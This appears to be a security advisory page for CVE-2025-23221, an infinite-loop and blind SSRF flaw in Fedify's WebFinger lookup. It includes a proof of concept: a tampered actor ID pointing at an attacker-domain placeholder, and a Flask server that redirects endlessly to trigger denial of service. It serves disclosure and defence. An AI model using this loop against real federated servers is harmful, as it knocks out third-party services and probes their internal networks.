{"hash":"dbc58e17736cdff8dddc287fe79c16e9153e4f59","data":{"post":{"title":"Fedify WebFinger Infinite Loop and Blind SSRF","path":"/vulnerabilities/fedify-infinite-loop-blind-ssrf/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.\nMoreover, this issue can also be maneuvered into performing a Blind SSRF attack.</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://www.npmjs.com/package/@fedify/fedify\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">@fedify/fedify</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,1.0.13]</p>\n<p>(,1.1.10]</p>\n<p>(,1.2.10]</p>\n<p>(,1.3.3]</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (<a href=\"https://www.w3.org/TR/activitypub/#security-considerations\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.w3.org/TR/activitypub/#security-considerations</a>), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.</p>\n<p>The <strong>lookupWebFinger</strong> function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<ol>\n<li>In order to show a use case of the vulnerability, we can use the demo app presented at this URL: <a href=\"https://github.com/dahlia/microblog\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/dahlia/microblog</a></li>\n<li>We will create two machines, victim and attacker, each one on a different server with different domains.</li>\n</ol>\n<p><strong><em>Victim Machine</em></strong></p>\n<ol>\n<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>\n</ol>\n<ol start=\"2\">\n<li>Install a Deno server:\n<code>curl -fsSL https://deno.land/install.sh | sh</code>\n<code>source ~/.bashrc</code>\n<code>deno --version #check deno is working</code></li>\n</ol>\n<ol start=\"3\">\n<li>Pull the git repository of the victim blog app:\n<code>git clone https://github.com/dahlia/fedify.git</code></li>\n</ol>\n<ol start=\"4\">\n<li>Modify the federation object to remove signature checks for the sake of easy testing:\nOn file <strong><em>/examples/blog/federation/mod.ts</em></strong> edit the <strong><em>createFederation<void></em></strong> object the following attribute: <strong><em>skipSignatureVerification: true</em></strong>.</li>\n</ol>\n<ol start=\"5\">\n<li>Change into the blog app directory ( /examples/blog ) and run the app:\n<code>deno task preview</code></li>\n</ol>\n<ol start=\"6\">\n<li>Surf to the application on the browser, and register a user on the app.</li>\n</ol>\n<p><strong><em>Attacker Machine</em></strong></p>\n<ol>\n<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>\n</ol>\n<ol start=\"2\">\n<li>Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):\n<code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash</code>\n<code>source ~/.bashrc</code>\n<code>nvm list-remote</code></li>\n</ol>\n<ol start=\"3\">\n<li>Install the latest stable version:\n<code>nvm install {latest_ver} #for example: v20.10.0</code>\n<code>source ~/.bashrc</code>\n<code>npm -v #check it works</code>\n<code>node -v #check it works</code></li>\n</ol>\n<ol start=\"4\">\n<li>Download the attacker app repository:\n<code>git clone https://github.com/dahlia/microblog.git</code></li>\n</ol>\n<ol start=\"5\">\n<li>Disable request signature validations:\nEdit the <strong><em>/src/federation.ts</em></strong> file and add a <strong><em>skipSignatureVerification: true</em></strong> attribute to the <strong><em>createFederation</em></strong> object.</li>\n</ol>\n<ol start=\"6\">\n<li>Modify the <strong><em>/src/federation.ts</em></strong> file and tamper with the Person object on the actor dispatcher ( <strong><em>setActorDispatcher(\\\"/users/{identifier}\\\"</em></strong> ) - change the actor ID attribute <strong><em>“id: ctx.getActorUri(identifier)</em></strong>” into “<strong><em>id: new URL(‘http://&#x3C;ATTACKER_MACHINE_DOMAIN>:1337/users/enterloop’)</em></strong>”.</li>\n</ol>\n<ol start=\"7\">\n<li>Install Python flask and create the Python Flask redirect server:\n<code>apt update</code>\n<code>apt install python3-flask</code></li>\n</ol>\n<pre><code class=\"language-python\">from flask import Flask, redirect\n\napp = Flask(__name__)\n\n@app.route('/health')\ndef health():\n    return \\\"hello\\\", 200\n\n@app.route('/.well-known/webfinger')\ndef ssrfinger():\n    return redirect(\\\"http://&#x3C;ATTACKER_MACHINE_DOMAIN>:1337/endlessloop\\\")\n\n@app.route('/endlessloop')\ndef endlessloop():\n    return redirect(\\\"http://&#x3C;ATTACKER_MACHINE_DOMAIN>:1337/endlessloop\\\")\n\nif __name__ == '__main__':\n    app.run(debug=True,host='0.0.0.0' ,port=1337)\n</code></pre>\n<ol start=\"8\">\n<li>Run the python server and attempt to reach the “<strong><em>/health</em></strong>” path to see the server functions as expected.</li>\n</ol>\n<ol start=\"9\">\n<li>Read the <strong><em>README.txt</em></strong> file on the attacker app and follow the instructions on how to execute the app.</li>\n</ol>\n<ol start=\"10\">\n<li>Surf the app on the browser and attempt to follow the federated user on the victim’s machine.</li>\n</ol>\n<ol start=\"11\">\n<li>Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).</li>\n</ol>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are provided for this vulnerability.</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/fedify-dev/fedify/security/advisories/GHSA-c59p-wq67-24wx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GHSA</a></p>\n","description":"CVE-2025-23221 Medium severity. Infinite loop and Blind SSRF found inside the WebFinger mechanism","date_published":"2025-01-20","xray_id":"","vul_id":"CVE-2025-23221","severity":"medium","discovered_by":"Natan Nehorai","last_updated":"2025-01-20","cvss":5.4}},"context":{}}